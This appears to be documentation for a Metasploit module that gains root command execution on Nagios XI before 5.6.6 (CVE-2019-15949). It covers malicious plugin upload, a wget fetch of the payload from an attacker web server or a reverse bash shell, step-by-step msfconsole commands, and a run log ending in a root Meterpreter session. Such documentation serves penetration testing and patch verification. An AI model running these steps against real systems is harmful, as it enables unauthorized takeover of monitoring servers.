## Introduction
This module exploits a vulnerability in Nagios XI before 5.6.6 in order to execute arbitrary commands as root.

The module first checks if the supplied credentials are valid and belong to a user with permissions to modify plugins. It then exploits these permissions by uploading a malicious plugin to the target and subsequently sending an HTTP GET request to profile.php?cmd=download. This request downloads a system profile from the server and in the process launches the getprofile.sh script as root via a passwordless sudo entry. This script executes the malicious plugin as root.

For all supported payloads other than cmd/unix/reverse_bash, the module first starts an HTTP Server to serve the payload, and then writes a wget request for the payload to the malicious plugin. When the plugin is executed, the target requests the payload, which is then sent to the target and executed as root. However, this method will only work if wget is installed on the target, which may not necessarily be true, for instance if Nagios XI is running on a minimal/custom CentOS installation. In the latter case, the payload cmd/unix/reverse_bash must be selected. If the module detects this payload, it does not start an HTTP Server, but writes the payload directly to the malicious plugin instead, thereby avoiding the need for a wget request. The payload cmd/unix/reverse_bash was chosen because it is the most likely payload to still work on a minimal Linux installation.

Valid credentials for a user with administrative privileges are required. This module was successfully tested on Nagios XI 5.6.5 running on CentOS 7.

## Vulnerable system
Nagios XI before 5.6.6.

## Verification Steps

1. Install the module as usual
2. Start msfconsole
3. Do: `use exploit/linux/http/nagiosxi_authenticated_rce`
4. Do: `set RHOSTS [IP]`
5. Do: `set SRVHOST [IP]`
6. Do: `set USERNAME [username]`
7. Do: `set PASSWORD [password]`
8. Do: `set payload [payload]`
9. Do: `set LHOST [IP]`
10. Do: `set LPORT [port]`
11. Do: `exploit`

## Options

1. `USERNAME`. The username to authenticate with. This user should have permissions to modify plugins. The default setting is `nagiosadmin`, which is the default admin account for Nagios XI systems.
2. `PASSWORD`. The password to authenticate with.
3. `Timeout`. The number of seconds to wait for the exploit to connect back. This value is set at 10 by default because it usually takes a while for the plugin to execute after the GET request to rofile.php?cmd=download is sent. If the module fails with a timeout error the first time, just run it again with a higher Timeout value.

## Scenarios

```
msf5 exploit(linux/http/nagiosxi_authenticated_rce) > show options

Module options (exploit/linux/http/nagiosxi_authenticated_rce):

   Name       Current Setting       Required  Description
   ----       ---------------       --------  -----------
   PASSWORD   P@ssw0rd!             yes       Password to authenticate with
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.1.1           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                    yes       The target port (TCP)
   SRVHOST    192.168.1.2           yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080                  yes       The local port to listen on.
   SSL        false                 no        Negotiate SSL/TLS for outgoing connections
   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                     yes       Base path to NagiosXI
   Timeout    10                    yes       Number of seconds to wait for the exploit to connect back)
   URIPATH                          no        The URI to use for this exploit (default is random)
   USERNAME   nagiosadmin           yes       Username to authenticate with
   VHOST                            no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.2      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf5 exploit(linux/http/nagiosxi_authenticated_rce) > run
[*] Started reverse TCP handler on 192.168.1.2:4444 
[*] Found Nagios XI application with version 5.6.5.
[*] Starting web server
[*] Using URL: http://192.168.1.2:8080/eFFP5lYvZ8eCnR0
[*] Uploading malicious 'check_ping' plugin...
[+] Successfully uploaded plugin.
[*] Executing plugin...
[*] Waiting for the plugin to request the final payload...
[*] 192.168.91.1:80 - Payload request received: /eFFP5lYvZ8eCnR0
[*] Sending payload...
[*] Sending stage (3021284 bytes) to 192.168.1.1
[*] Meterpreter session 1 opened (192.168.1.2:4444 -> 192.168.1.1:56510) at 2020-02-27 16:27:49 +0100
[*] Deleting malicious 'check_ping' plugin...
[+] Plugin deleted.
[*] Server stopped.
sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: uid=0, gid=0, euid=0, egid=0

```
## References
1. <https://github.com/jakgibb/nagiosxi-root-rce-exploit>
2. <https://nvd.nist.gov/vuln/detail/CVE-2019-15949>